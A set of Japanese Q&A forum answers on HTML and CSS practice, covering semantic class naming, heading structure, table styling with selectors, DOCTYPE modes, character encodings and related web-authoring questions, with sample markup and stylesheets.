"サイトリンク"や"一行サイトリンク"と呼ばれるものです。製作者側では方法はありません。 サイトマップの登録とは無関係です。 googleが、そのサイト全体の利用状況を鑑みて自動的に構成します。 サイトリンク - ウェブマスター ツール ヘルプ( https://support.google.com/webmasters/answer/473 … ) Google ウェブマスター向け公式ブログ: 一行表示のサイトリンク( http://googlewebmastercentral-ja.blogspot.jp/200 … ) 　これらの表示はブロックはできますが、表示するように指定はできません。
※ metaが２つあるのは単純にコピペミスでしょうか？ 解決策になるかどうかわかりませんが、og:imageは200x200 pixelが最小値だそうで、それより小さいとかはないでしょうか？確認してみてください。 あと、FBが提供しているデバッグツールもあるようなのでこの辺を利用して確認してみると良いかもしれません。 参考URL：https://developers.facebook.com/tools/debug
　classの使い方を完全に間違えて言います。そんなつけ方はしてはなりません。とても多い間違いです。そのためにとても醜いコードになってしまっています。 　それが端的に分かる説明は、仕様書のDIV.SPANの項での 『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。』の説明です。 ★HTMLは文書構造を要素ごとにマークアップする物です。デザイン(プレゼンテーション)じゃない 　<h1>見出し</h1><p>段落</p><blockquote cite="">引用</blockquote>・・・ 　HTMLに用意されていた要素では、文書構造が十分示せないために、それを補完するためにclassが用意されています。 　残念ながらこれが理解されたとは言いがたくHTML5では、新しい要素が追加されました。 　重要)) http://standards.mitsue.co.jp/resources/w3c/TR/h … HTML4.01とHTML5のふたつの例を上げておきます。 [HTML4.01] <body> 　<div class="header"><!-- この文書のヘッダ --> 　　　<h1>ページタイトル</h1> 　　　<div class="nav"><!-- サイトナビ --> 　　　　<ol></ol> 　　　</div> 　</div> 　<div class="section"><!-- 文書の本文 --> 　　<h2>本文見出し</h2> 　　<div class="section"> 　　</div> 　　<div class="nav" id="tableContent"><!-- このページ目次 --></div> 　　<div class="aside">この本文と直接関係しない記事</div> 　</div> 　<div class="footer"></div> </body> [HTML5] <body> 　<header><!-- この文書のヘッダ --> 　　　<h1>ページタイトル</h1> 　　　<nav><!-- サイトナビ --> 　　　　<ol></ol> 　　　</nav> 　</header> 　<section><!-- 文書の本文 --> 　　<h2>本文見出し</h2> 　　<section><!-- sectionの階層で文書のアウトラインが分かる --> 　　</section> 　　<nav id="tableContent"><!-- このページ目次 --></nav> 　　<aside>この本文と直接関係しない記事</aside> 　</section> 　<footer"></footer> </body> ※class名はこのように文書構造を補完する目的で使用します。googleはこのようなclass名は理解できますし、著者自身も将来のメンテナンスが容易になるでしょう。 ＞同じクラス名はつけないほうが良いですか？ space-separated list of classes 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから class = cdata-list [CS] 　この属性は、ある要素に1つのクラス名を割り当てるか、または複数のクラス名を設定する。 幾つの要素に対してでも、同じクラス名あるいはクラス名群が割り当てできる。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［The global structure of an HTML document (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　要素をグループ化するためのものですから、そのためにならいくら重複しようが構わない。 　上記例だと、navというナビゲーションを示すclass名は、header内にもsection内にも存在します。 　これらはそれぞれ div.nav ol,div.nav ol li{list-style:none;margi:0;padding:0;} div.nav ol li{width:5em;} と共通な指定も div.header div.nav ol li{display:inline-block;} div.section div.nav ol li{width:10em;} と個別指定もできる。そのためのclassですから・・ ★じゃ、質問のようなtableの場合、それぞれのセルのデザインを変えたいときは？？ 　この例だと、thやtdにclassをつける必要はまったくありません。 　^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 　<table summary="コーヒーの輸入量" border="1!> 　　<tr> 　　　<th abbr="輸入先">輸入先</th><th abbr="2012">2012年</th><th abbr="2013">2013年</th> 　　</tr> 　　<tr> 　　　<td>ブラジル</td><td>121,438,277</td><td>157,274,506</td> 　　</tr> 　　<tr> 　　　<td>ベトナム</td><td>75,725,189</td><td>79,472,845</td> 　　</tr> 　　<tr> 　　　<td>インドネシア</td><td>48,199,896</td><td>45,401,838</td> 　　</tr> 　</table> 　これで、スタイルシートで使うときは 　いちいちHTML見なくても table[summary="コーヒーの輸入量"] th+th{/* コーヒー消費量の表のthに続くthは */ 　width:8em; /* 8文字幅 */ } table[summary="コーヒーの輸入量"] td+td{/* 同、tdに続くtdは */ text-align:right;/* 右寄せ */ background-color:yellow;/* 背景は黄色 */ } と、書いて行けます。 　あるいは、挿絵的要素中のtableでしたら ・・・・ <div class="figure"> 　<table></table> </div> とマークアップされているので div.figure table th+th{/* 参考表のthに続くthは */ 　width:8em; /* 8文字幅 */ } div.figure table td+td{/* 同、tdに続くtdは */ text-align:right;/* 右寄せ */ background-color:yellow;/* 背景は黄色 */ } ですみますね。 ポイント 1) class名は要素をグループ化するために用いる。 　そして、それは文書構造を補完する目的でつける。 2) スタイルシートではその文書構造に従ってスタイルを適用したい要素をセレクタを使って指定する。 5 セレクタ( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) 6 プロパティ値とカスケーディング、継承の割り当て( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) ★HTML/CSSを使う最大・唯一の目的は、「構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」です。 　
見出し要素 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 見出しの要素は、その章・節で述べられる話題を短く記すものである。見出し情報は、ユーザエージェントによって、例えば文書の目次を自動生成するために用いられたりもするであろう。 HTMLには、最上位のH1から最低位のH6までの、6レベルの見出しがある。視覚系ブラウザは通常、より上位の見出しを大きいフォントで、より低位の見出しを小さいフォントでレンダリングする。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［The global structure of an HTML document (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　ブラウザなどが目次・アウトラインを構成することを考えると <body> |-- <h1>部<h1> |　　|-- <h2>章</h2> |　　|　　|-- <h3>節</h3> |　　|　　　　　|-- <h4>項</h2> |　　|-- <h2>章</h2> のように考えれば良いです。 ＞サブタイトルが５つくらいあるのですが、 　同じ階層なら、<h2>なら<h2> ★なお、ブロックごとにDIVで区切るのでしたら・・ 　『DIV要素・・は、・・・class属性と併用することで、文書に構造を付加( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』に使用しますから <body> 　<div class="header"><h1>ページタイトル<h1></div> 　<div class="section"> 　　<h2>章タイトル</h2> 　　<div class="section"> 　　　<h3>項タイトル</h3> となりますね。HTML5では、階層--アウトラインはsectionの階層で決まりますから <body> 　<header><h1>ページタイトル<h1></header> 　<section> 　　<h2>章タイトル</h2> 　　<section> 　　　<h3>項タイトル</h3> または、 <body> 　<header><h1>ページタイトル<h1></header> 　<section> 　　<h1>章タイトル</h1> 　　<section> 　　　<h1>項タイトル</h1> の何れかに統一することが求められます。前者は階層が分かりやすい、後者はメンテナンスが容易。なおsectionは見出し要素を一つだけ必ず持つことが期待される。
ん～無理かどうかは実際に作ってみないとわからない。 きちんと開発したらたぶん、お望みのものは出来ると思う。 開発者ツールは今後Webページを作っていく上でかなりの手助けになるからふわっとでも使い方を覚えたほうが良い。
>iOSやandoroidでフォーム入力時に表示されるキーボードを数字のみや英字キーボードに指定できるかなと思ったのですが無理なんですね。 CSSでなくinput type="tel"や"url"である程度対応できます。 使えなくもないですが、完璧に対応できているわけではありません。 実機をみながら確認してみてください。 http://html-five.jp/26/ http://dev.classmethod.jp/ria/html5/mobile-html5 …
＞カッコは使わないほうがいいよと言われました。 なぜ仕様書確認しない？？？ <!ELEMENT TITLE - - (#PCDATA) -(%head.misc;) -- document title --> 　http://www.asahi-net.or.jp/~sd5a-ucd/rec-html401 … 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 　すべてのHTML文書には、HEAD中に、1つのTITLE要素があらねばならない。 　著者は、当該文書の内容を識別するためにTITLE 要素を用いる必要がある。 ユーザは文脈抜きで文書を参照することがあるため、著者は文脈を踏まえたタイトルを提供する必要がある。 　つまり、著者は、「概説」などの文脈不明なタイトルではなく、「中世の養蜂についての概説」のようなタイトルを提供しなければならない。 　アクセス性の点から、ユーザエージェントは常に TITLE要素の内容をユーザが得られるようにしなければならない。ここには、フレーム文書のTITLE要素も含む。 ユーザに提供する機構は、キャプションとして示すことや話すことなど、ユーザエージェントに依存する。 　タイトルには、アクセントつきの文字や特殊文字等を表す文字実体が含まれてよいが、コメントも含めて他のマーク付けが現れてはならない。 次に文書のタイトルを例示する。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［The global structure of an HTML document (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 『PCDATA は Parsed Character Data の略で、「構文解析対象文字データ」です。Parsed というのは SGML 的に解釈 (パース) されるということを意味します。このデータ型は任意の長さを持つ (長さゼロでも良い) 任意のテキストです( http://bakera.jp/ref/html/data/pcdata )』 　どこにも「カッコは使わないほうがいい」とは書いてないです。 　何か疑問があったら、すぐ仕様書を確認する癖をつけましょう。 　HTML学ぼうとしたら、まずHTML4.01の仕様書を通読しておく。必要なときどこを読めばよいかが分かる程度でよい。 HTML 4.01仕様書( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　また Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html ) 　の右上でDATAを選択してチェックすると、厳密すぎるくらい厳密に文法はチェックしてくれる。 　ネットから正しい情報を得るのは藁の中から針を探すより難しい。初学者のときは、決してゴミサイトを探すより先に仕様書だけは目を通して理解しておくこと。それが脇道にそれない最短の学び方。
div#main{position:relative;min-height:300px;border:10px blue solid;background-color:red;} div#main:before{content:"";display:block;width:110%;height:110%;top:-5%;left:-5%;position:absolute;background-color:yellow;z-index:-5;} borderは簡略化プロパティですから border-style,border-width,border-colorをあわせて指定します。
既出のようにUTF-8以外を選ぶ理由はほとんどありません。 わずかにある理由を挙げますと、 使う文字が日本語の基本的な文字に限られているという大前提の上で、以下のような場合があります。 ・マシンが古いLinux 古いLinuxはOS標準の文字コードがEUC-JPです。たぶんUNIXも同様。 今は大抵UTF-8ですので理由になりません。 ・ソフトが古い Windows用の古いソフトは文字コードがShift_JISしか使えない物が多くあります。 たとえそれを動かすWindowsが新しくても、ソフトが古ければShift_JISを使わざるを得ません。 ・ファイルサイズを小さくしたい 日本語の文章を書いた時、UTF-8では大抵の漢字が3バイトなのに対し、Shift_JISやEUC-JPでは2バイトで済みます。 またShift_JISでは半角カナが1バイトで使えます。(UTF-8では3バイト) ・考えるのが面倒くさい Windowsマシンで何も考えないとファイルはShift_JISになります。 それに合わせれば何も考えずに済みます。
divとは”箱”です。 箱に名前をつけてcssからその名前のついた箱を指定します。 divはブロック要素なので（横幅いっぱいに広がる箱） その中にimgを置くと”箱”の中に”画像”が左寄りに入った状態になります。 <div class="photo"><img src="http://○"></div> この箱をCSSで指定してtext-align:rightをかけてやると箱の中で右よりになります。 div.photo { text-align: right; }
No2です。 ＞遷移先はリクエストヘッダから取得するのですが、そこのプログラムや仕組みは ＞都合上、変更する事ができなくて。 遷移先のプログラムを変更できないなら、この話は最初から無理だと思いますよ。 「あるサイトAで、ログイン操作をすることなく、別サイトBから、そのサイトAにログインしたかのようにデータを送り込む」って、別の言い方をすると、「サイトAに脆弱性があって、その脆弱性を突いて別のサイトBから攻撃する」ってことです。 シングルサインオンは両方のサイトが協調しないと無理です。
個人的にはCSS3はどんどん普及してもらいたいのですが、自分のもらう案件ではまだまだIE7に対応させろと無茶ぶり言われるので未だにCSS2で後方互換を持たせています。 要はターゲット次第ですね。 実際のモダンブラウザのシェアは9割以上ですし、IE7を使っているようなユーザーが収益を生むとも考えられません。 まだまだCSS3には草案があふれています。border-関連のような確定したものなら使ってもいいと思いますが、草案段階のもの（ベンダープレフィックス必須）は使わないほうがいいと思います。
対象セルにクラスをつけて指定するという方法はダメでしょうか？ <style> td.column { width:10% } </style> <table border=1 cellspacing=1 cellpadding=1> <tr><td>a</td><td>b</td><td class="column">c</td></tr> <tr><td>1</td><td>2</td><td class="column">3</td></tr> </table> ターゲットブラウザにもよりますが、nth-childはモダンブラウザにしか効きませんのであまりおすすめできません。 それとサイズを厳密に調整したいのであればborder,cellpaddingは0にして全てスタイルで指定したほうがいいと思います。なぜならwidth=10%+cellspacing+border+cellpaddingになってしまいますから。
単純に table{width:50%;} table+table{position:absolute;top:0;right:0;} table{width:49%;float:left;} table+table:after{content:"";display:block;cleaar:left;} 他にも様々な手法があるでしょう。 どの手法をとるかは、はっきり言って内容によります。 ・ページレイアウトの目的で表を用いる。は論外として 1) 内容的に一つの表なのでしたら<tbody></tbody>を二つ用意する。 2) まったく関連しない表ならfloat 3) 関連するならabsolute 4) 別のセクションに属するものならdivで囲む 　など、どれが最適かは、tableの内容に大きく依存するものです。
empty-cellsです。 　テーブルの各要素は、「テーブルのレイヤーと透過性( http://momdo.s35.xrea.com/web-html-test/spec/CSS … )」の様に扱われます。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 'empty-cells' 値: show | hide | inherit 初期値: show 適用対象: 'table-cell'要素 継承: yes パーセンテージ: 利用不可 メディア: visual 算出値: 指定値 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Tables - CSS 2.1 spec (ja)( http://momdo.s35.xrea.com/web-html-test/spec/CSS … )］より cellpadding - HTML - 教えて！goo( http://oshiete.goo.ne.jp/qa/8788064.html )の回答で示したtableを分離ボーダーで書き直すと・・・ サンプル ★Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html# ) 　でチェック済みのHTML4.01strict+CSSです。 ★タブは＿に置換してあるので戻す。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- html,body{margin:0;padding:0;} h1,h2,h3,h4,h5,h6{margin:0;line-height:1.6em;} p{text-indent:1em;} div.header,div.section,div.footer{width:90%;min-width:630px;max-width:900px;margin:0 auto;padding:5px;} /* tableのデザイン */ table[summary="テストの表"]{ border:gray outset 10px; border-collapse:separate;/* ★分離ボーダーモデル★ */ border-color:red orange yellow lime; border-spacing:10px;/* ★セルの間隔を指定 ★ */ empty-cells:show;/* ★空白行も表示する hideで消える */ } table[summary="テストの表"] th, table[summary="テストの表"] td{ border:gray solid 2px; padding:10px 1em 20px 1em; } table[summary="テストの表"] th{ padding:10px 2em 20px 1em; } table[summary="テストの表"] tr:nth-child(2n) th{ background-color:yellow; } table[summary="テストの表"] tr:nth-child(2n) td{ background-color:rgb(255,255,180);} } table[summary="テストの表"] tr:nth-child(2n){ } /* aqua、black、blue、fuchsia、gray、green、lime、maroon、navy、olive、orange、purple、red、silver、teal、white、yellow */ --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿</div> ＿<div class="section"> ＿＿<table summary="テストの表" border="1"> ＿＿＿<tbody> ＿＿＿＿<tr> ＿＿＿＿＿<th abbr="あ">あ行</th><td>あ</td><td></td><td>う</td><td>え</td><td>お</td> ＿＿＿＿</tr> ＿＿＿＿<tr> ＿＿＿＿＿<th abbr="か">か行</th><td>か</td><td>き</td><td></td><td>け</td><td>こ</td> ＿＿＿＿</tr> ＿＿＿＿<tr> ＿＿＿＿＿<th abbr="さ">さ行</th><td>さ</td><td>し</td><td>す</td><td></td><td>そ</td> ＿＿＿＿</tr> ＿＿＿＿<tr> ＿＿＿＿＿<th abbr="た">た行</th><td></td><td>ち</td><td>つ</td><td>て</td><td>と</td> ＿＿＿＿</tr> ＿＿＿</tbody> ＿＿</table> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2013-03-03</dd> ＿＿</dl> ＿</div> </body> </html>
あいにくFC2は利用していないので、よくわかりませんが。 CSSの方でoverflow設定してみてはどうでしょう。 http://ojiba.blog4.fc2.com/blog-entry-294.html
＞というスタイルシートがある場合、まとめることは可能でしょうか？ 　つまみ食いはダメですよ。 5 セレクタ( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) 　→5.8 属性セレクタ( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) ★発想が違う!!!・・・とても大事な考え方ですから、しっかり自家薬籠中のものにすること。 　スタイルシートを使ってデザインする最大の目的は『構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』です。極論するとHTMLは徹底的に文書構造だけをマークアップします。それをどのように表現するか（プレゼンテーション）は、もっぱらスタイルシートに任せます。 　ふたつのtableが同じデザインになると言う事は、この二つは同じ文書構造にあると言う事です。 例えば一つの文書内にいくつものtableが存在するとします。 <body> 　<div class="header">・・・・</div> 　<div class="section"> 　　・・・・ 　　<table summary="世界の国別 人口"> 　　　<tbody> 　　　　<tr><td>・・・・</tr> 　　　</tbody> 　　</table> 　　・・・・・ 　　<table summary="日本の県別 人口"> 　　　<tbody> 　　　　<tr><td>・・・・</tr> 　　　</tbody> 　　</table> 　　・・・・・ 　　<div class="figure"> 　　　<table summary="人口 推移"> 　　　　<tbody> 　　　　　<tr><td>・・・・</tr> 　　　　</tbody> 　　　</table> 　　</div> 　　<div class="nav"> 　　　<table summary="10月 カレンダー"> 　　　　<tbody> 　　　　　<tr><td>・・・・</tr> 　　　　</tbody> 　　　</table> 　　　<table summary="11月 カレンダー"> 　　　　<tbody> 　　　　　<tr><td>・・・・</tr> 　　　　</tbody> 　　　</table> 　　</div> 　　<div class="aside"> 　　　<table summary="関連商品"> 　　　　<tbody> 　　　　　<tr><td>・・・・</tr> 　　　　</tbody> 　　　</table> 　　</div> 　</div> 　<div class="footer"></div> </body> だとします。 注】header,section,aside,figure,footerなどのclass名は、HTML5の新しい要素( http://standards.mitsue.co.jp/resources/w3c/TR/h … )に合わせています。class名は、このように文書構造を示すために使用する。 　これだと ※本文中のtableだと 　div.section table{}で、figure,aside,nav内も含めてすべてのtableのデザインができる 　div.section div.aside table{}で、aside中のtableだけ 　div[summary~="人口"]{}だと、summaryの値リストの一つに"人口"をもつもの 　div.section * table{}だと、sectionの孫以下のtable 　div.section>table{}だと、div.sectionの子供のtable(子孫じゃない) というふうに、セレクタで特定することができるのです。 ＞というスタイルシートがある場合、まとめることは可能でしょうか？ ＞table[summary="test1 test2"]{ 　これはsummary属性に"test1 test2"の値を持つものになりますから、違います。 table[summary="test1"],table[summary="test2"]{} になりますが、それ以前に!!!。同じデザインに死体と言う事は、HTMLにきちんと文書構造が示されていれば、（上記の例だと） div.section>table{} 　div.sectionの直接の子供であるtableと指定できるのです。 　セレクタを含むカスケーディングの仕組みは、CSS--Cascading Style Sheetsの根幹ともいえる最重要な部分です。それを知らなきゃCSS使うことができないです。 　　 　プロパティだけ説明してある、役に立たないサイトがあまりに多すぎる。
今、HTMLとXHTMLという2つのものがあります。 <br>は空要素というタグで、</br>のような 終了タグがありません。 ですので普通は、 あいうえお<br> かきくけこ という風に書きます。 ですがXHTMLというものでは、 必ず、終了させないといけないのです。 こういう風に書きます。 あいうえお<br /> かきくけこ <br>はさっきも言ったとおり、終了タグがありません。 ですので文章をいれる必要もありません。
実質javascript自体は外部化するのが基本ですから 「<!-- //-->」でhtmlに埋め込むこと自体 デバグ用であれば不要だし、本番用であれば使わない実に中途半端です こういう書き方もあるんだよ・・・レベルのもので 実質使うことはほぼ皆無でしょう。 （他人のソースをのぞくときとか、テストに出たとき用の知らないでは すまされないけど、ホントに使うとバカにされる機能） なおスタイルシートの処理にも同様の書き方をすることがあります。
> そもそもLINK REV="MADE"はどういう意味ですか？ ちょっと調べてみたら、いろいろな場所で間違って使われているようです。下記のサイトでも代わりに REL="author" を使えと書かれています（author の Note 部分）。 https://developer.mozilla.org/ja/docs/Web/HTML/L … 要するに作者への連絡先を記載するためのものですが、上記の記述では SPAM の送付先にされてしまう恐れがあるため、メールアドレスではなく連絡フォームの URL を記載することを推奨しています。
フォーム エンターで送信しないで、検索すると色々な方法が見つかります、たとえば http://allabout.co.jp/gm/gc/23972/ それと、そのフォームは入力数が多いので、段階的入力機能が付いた下のメールフォームに変えるとかされたらいかがですか。 http://www.synck.com/contents/download/cgi-perl/ …
・class名はデザインのためじゃない!! 　　あくまで、その文書を構成している要素をタグを使ってマークアップする。 　　その中で複数の【文書の構造上】複数で構成されるグループはclassで、 　　唯一のものは、idで分類する。 　　　<h2 class="plant Name" id="Camellia_japonica">椿</h2> 　　　<p><span class="plant Name">椿</span>はツバキ科の・・・</p> 　　　<h2 class="animal Name" id="Nyctereutes_procyonoides">タヌキ</h2> 　　　<p><span class="animal Name">タヌキ</span>はイヌ科タヌキ属の・・・</p> ・スタイルシートで、HTML文書中のある要素にスタイルを指定するときには、その文書構造を元に指定していきます。 　段落(p要素)は、マージンを消して一文字インデントさせるなら 　　p{margin:0;text-indent:1em;} 　見出し(h2)で植物名が書かれているものは赤字にしたいのでしたら、 　　h2.plant{color:red;} 　植物・動物の名前は太字でしたら 　　*.Name{font-weight:bold;} 　段落中の名前はアンダーライン引きたければ 　　p span.Name{text-decoration:underline;} 　最初の段落だけ先頭の文字を 　CSS(カスケーディングスタイルシート)のカスケードの仕組みを理解していないと、複雑怪奇でメンテナンスができなくなるHTML、CSSを書くことになります。 　そのため、CSSの命といえるカスケード 5 セレクタ( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) 6 プロパティ値とカスケーディング、継承の割り当て( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) 　をまず身につけましょう。仕様書でもプロパティより前に説明がある。
大きく違います。一応資料 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 著者 　・・・【中略】・・・ 　HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。 HTML 4仕様が定める各DTDの詳細については バージョン情報の項を参照のこと。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［4.1 定義( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから ・HTML 4.01厳密型DTD。 　これは、推奨しないこととなった要素や属性を含まず、またフレーム設定用の要素・属性をも含まない。 このDTDを用いる文書は、次の文書型宣言をせよ。 　<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［7.2 HTMLバージョン情報( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN"> 　Transitional/Framesetの指定が無いStrictと呼ばれる定義は、Standardモード <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> 　4.01のDTDを明示的に指定した場合は、上記の条件に関係なく常にStandardモード 　これは、今は少ないと思いますが、MacIEの場合に前者はQuirks(互換モード)になってしまいます。 　よって、HTML4.01strictで作成する場合は、明示的にstrictを宣言したほうが良いです。 ★なお、HTML5では。DTDを使いませんから<!DOCTYPE html>となり、単純にブラウザにstandard(標準モード)を指定するだけになります。
擬似要素を使うのでIE8以下は非対応です。 「HTML」（お借りしました） <ul> <li><a href="/">トップ</a></li> <li><a href="/News">速報</a></li> <li><a href="/Photo">写真</a></li> <li><a href="/Video">映像</a></li> <li><a href="/Book">雑誌</a></li> </ul> 「CSS」 ul{ letter-spacing: -.40em;/*隙間埋め*/ } /* li を横並び　*/ li{ display:inline-block; letter-spacing: normal; /* 文字間を通常に戻す */ padding:5px 20px; } /* li の最後の要素以外の右辺にborderを追加　*/ li:not(:last-child){ border-right:1px dotted grey; }
今はbordercolor,cellspacingは使うこと無いですよ。 bordercolorという属性は存在しません。 cellspacing、 cellpadding は今は使われなくなりましたが、それぞれの関係は長くなるので 11.3.3 コマのマージン( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) を読んでください。 ★現在は、プレゼンテーションはスタイルシートで指定するのが基本です。 『スタイルシートはこれらの問題を解決すると同時に、HTMLにおける制限されたプレゼンテーション機構に取ってかわる。スタイルシートでは、行間の設定やインデントの設定、テキスト色や背景色、フォントのサイズとスタイル、その他様々なプロパティの設定が簡単にできる。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 　下記に簡単なサンプル上げておきます。 　ご覧のように、細かい設定や複雑な設定がスタイルシートで自在にできます。 ★Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html# ) 　のDATA入力で確認済みのHTML4.01strictです。 ★タブは＿に置換してあるので戻す。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- html,body{margin:0;padding:0;} h1,h2,h3,h4,h5,h6{margin:0;line-height:1.6em;} p{text-indent:1em;} div.header,div.section,div.footer{width:90%;min-width:630px;max-width:900px;margin:0 auto;padding:5px;} /* table関連 */ th,td{padding:0.5em 1em;} table+table{margin:10px;} table[summary="test1"]{border-collapse:collapse;} table[summary="test2"]{border: red dotted 5px;} table[summary="test2"] th{border: solid 2px blue;} table[summary="test2"] td{border: solid 2px green;} table[summary="test3"]{ border:outset 5px gray; border-collapse: separate; border-spacing: 15px 5px; } table[summary="test3"] th, table[summary="test3"] td{ border:inset gray 5px; } table[summary="test4"]{ border-top:dashed 5px aqua; border-right:double 10px gray; border-bottom:groove 5px red; border-left:ridge 5px lime; border-collapse: separate; border-spacing: 5px; box-shadow:10px 10px 10px 10px rgba(0,0,0,0.4); } table[summary="test4"] th, table[summary="test4"] td{ border:inset gray 5px; } table[summary="test4"] td+td{border-color:maroon;} table[summary="test4"] td+td+td{border-color:orange;} table[summary="test4"] td+td+td+td{border-color:teal;} --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<table border="1" summary="test1"> ＿＿＿<tbody> ＿＿＿＿<tr> ＿＿＿＿＿<th abbr="a">abc</th><th abbr="e">efg</th><th abbr="h">hij</th> ＿＿＿＿</tr> ＿＿＿＿<tr> ＿＿＿＿＿<td>abc</td><td>efg</td><td>hij</td> ＿＿＿＿</tr> ＿＿＿</tbody> ＿＿</table> ＿＿<table border="1" summary="test2"> ＿＿＿<tbody> ＿＿＿＿<tr> ＿＿＿＿＿<th abbr="a">abc</th><th abbr="e">efg</th><th abbr="h">hij</th> ＿＿＿＿</tr> ＿＿＿＿<tr> ＿＿＿＿＿<td>abc</td><td>efg</td><td>hij</td> ＿＿＿＿</tr> ＿＿＿</tbody> ＿＿</table> ＿＿<table border="1" summary="test3"> ＿＿＿<tbody> ＿＿＿＿<tr> ＿＿＿＿＿<th abbr="a">abc</th><th abbr="e">efg</th><th abbr="h">hij</th> ＿＿＿＿</tr> ＿＿＿＿<tr> ＿＿＿＿＿<td>abc</td><td>efg</td><td>hij</td> ＿＿＿＿</tr> ＿＿＿</tbody> ＿＿</table> ＿＿<table border="1" summary="test4"> ＿＿＿<tbody> ＿＿＿＿<tr> ＿＿＿＿＿<th abbr="a">abc</th><th abbr="e">efg</th><th abbr="h">hij</th><th abbr="k">klm</th> ＿＿＿＿</tr> ＿＿＿＿<tr> ＿＿＿＿＿<td>abc</td><td>efg</td><td>hij</td><td>klm</td> ＿＿＿＿</tr> ＿＿＿</tbody> ＿＿</table> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2013-03-03</dd> ＿＿</dl> ＿</div> </body> </html>
ウェブ製作でしたら、当然firefoxをお使いだと思いますが、その開発者向けツール( https://addons.mozilla.jp/firefox/extensions/dev … )に Firebug( https://addons.mozilla.jp/firefox/details/1843 )があります。 　それで確認すると一目瞭然なのですが、ol要素、li要素には、paddingと、marginがあることが確認できます。 スタイルシートのカスケーディングの仕組みで、 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 6.4.4 非CSSの見栄えヒントの優先順位 　ユーザーエージェントは、HTMLソースドキュメントの体裁用の属性を尊重してよい。その場合、これらの属性は0に等しい詳細度と対応するCSS規則に変換され、それらは著者スタイルシートの先頭に挿入されたかのように扱われる。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［6.4.4 非CSSの見栄えヒントの優先順位( http://momdo.s35.xrea.com/web-html-test/spec/CSS … )］より 　そのために、著者やユーザーが別途スタイルを指定しない場合、ブラウザのもつデフォルトのスタイルが適用された結果です。 　具体的には、 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから ・・・【中略】・・・ li{ display: list-item } ・・・【中略】・・・ ol, dl, dir, menu { margin: 1.12em 0 } ・・・【中略】・・・ ol, ul, dir,menu, dd{ margin-left: 40px } ol{ list-style-type: decimal } ol ul, ul ol,ul ul, ol ol { margin-top: 0; margin-bottom: 0 } 